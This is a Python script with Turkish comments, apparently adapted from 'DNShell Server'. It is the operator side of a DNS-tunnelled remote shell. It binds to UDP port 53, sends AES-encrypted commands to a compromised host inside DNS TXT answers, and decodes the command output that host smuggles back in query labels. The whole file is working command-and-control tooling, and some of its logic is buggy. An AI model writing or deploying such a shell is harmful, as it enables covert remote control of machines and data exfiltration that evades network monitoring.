# !/usr/bin/env python
# -*- coding: utf-8 -*-
# https://github.com/muhammetalgan
# DNShell Server V1.7 Esinlenmesidir !

from Crypto.Cipher import AES
import socket
import dnslib
import base64
import time
import sys
import os

BANNER = """
 
 ▄▄▄       ██▓      ▄████  ▄▄▄       ███▄    █ 
▒████▄    ▓██▒     ██▒ ▀█▒▒████▄     ██ ▀█   █ 
▒██  ▀█▄  ▒██░    ▒██░▄▄▄░▒██  ▀█▄  ▓██  ▀█ ██▒
░██▄▄▄▄██ ▒██░    ░▓█  ██▓░██▄▄▄▄██ ▓██▒  ▐▌██▒
 ▓█   ▓██▒░██████▒░▒▓███▀▒ ▓█   ▓██▒▒██░   ▓██░
 ▒▒   ▓▒█░░ ▒░▓  ░ ░▒   ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒ 
  ▒   ▒▒ ░░ ░ ▒  ░  ░   ░   ▒   ▒▒ ░░ ░░   ░ ▒░
  ░   ▒     ░ ░   ░ ░   ░   ░   ▒      ░   ░ ░ 
      ░  ░    ░  ░      ░       ░  ░         ░ 
                                                  
https://github.com/muhammetalgan

"""

PORT = 53
NEXT_COMMAND = base64.b64encode(b"nxt")
PROMPT = 'SHELL >> '
BLOCK_SIZE = 16  # Şifreleme nesnesi için blok boyutu: AES için 16, 24 veya 32 olmalıdır
PADDING = b'\x00'  # Dolgu için kullanılan karakter
EXIT = False  # 'quit' komutunu takip etmek için kullanılır
SECRET_KEY = os.urandom(32)  # Rastgele bir gizli anahtar oluşturur
IV = os.urandom(16)  # Rastgele bir IV oluşturur

# Metni yeterince dolduran bir lambda ifadesi:
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# Şifreleme ve base64 kodlama fonksiyonları:
encode_aes = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
decode_aes = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

# CBC şifreleme nesnesi oluşturma:
cipher = AES.new(SECRET_KEY, AES.MODE_CBC, IV)

def encrypt(string):
    encoded = encode_aes(cipher, string)
    return encoded

def decrypt(string):
    decoded = decode_aes(cipher, string)
    return decoded

def kill_application():
    print('\n\n--[ Bağlantı Sonlandırıldı ]--\n')
    sys.exit(0)

def spawn_shell(answer, payload):
    # Komut kabuğu oluşturma:
    shell_input = input(PROMPT)
    if shell_input == 'quit':
        EXIT = True  # Programı temiz bir şekilde sonlandırmak için flag kullanılır
    if shell_input == '':
        spawn_shell(answer, payload)  # Boşluk karakteri sorunlarını önleme
    out = base64.b64encode(encrypt(shell_input))
    answer.add_answer(
        *dnslib.RR.fromZone('{}.com 60 TXT "{}"'.format(payload, out)))
    return answer

def dash_decode(b64_cmd):
    # Kodlanmış '-' karakterlerini '=' ile değiştirme:
    if b64_cmd[3] == b'-':
        b64_cmd = b64_cmd[0] + b64_cmd[2] + b64_cmd[4:] + b'=='
    elif b64_cmd[1] == b'-':
        b64_cmd = b64_cmd[0] + b64_cmd[2:] + b'='
    return b64_cmd

def receive_payload(udps):
    data, addr = udps.recvfrom(1024)
    dns_d = dnslib.DNSRecord.parse(data)
    payload = dns_d.questions[0].qname.label[0]
    answer = dns_d.reply()
    return addr, payload, answer

def print_result(cmd_list):
    try:
        b64_cmd = b''.join(cmd_list)
        b64_cmd = dash_decode(b64_cmd)
        print('{}'.format(decrypt(base64.b64decode(b64_cmd)).decode('utf-8')).strip())
    except:
        # Base64 kod çözme hatası
        print('[HATA]: Ana makineden sonuç okunamadı!')

def shell_intro():
    for line in BANNER.split('\n'):
        time.sleep(0.048)
        print(line)

def main():
    shell_intro()  # ASCII sanatını yazdırma
    cmd_list = []  # Çalıştırılacak base64 kodlu komutları depolama
    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udps.bind(('', PORT))  # Belirtilen porta bağlanma
    print('\t.... İstek Bekleniyor ....')
    try:
        # İlk komut kabuğunu başlatma:
        addr, payload, answer = receive_payload(udps)
        answer = spawn_shell(answer, payload)
        udps.sendto(answer.pack(), addr)

        # Ana döngü:
        while True:
            addr, payload, answer = receive_payload(udps)
            if payload == NEXT_COMMAND:
                print_result(cmd_list)
                cmd_list = []
                answer = spawn_shell(answer, payload)
            else:
                cmd_list.append(payload)

            # Yanıtı gönderme:
            udps.sendto(answer.pack(), addr)
            if EXIT:
                kill_application()

    except (KeyboardInterrupt, EOFError) as e:
        udps.close()
        kill_application()


if __name__ == '__main__':
    main()
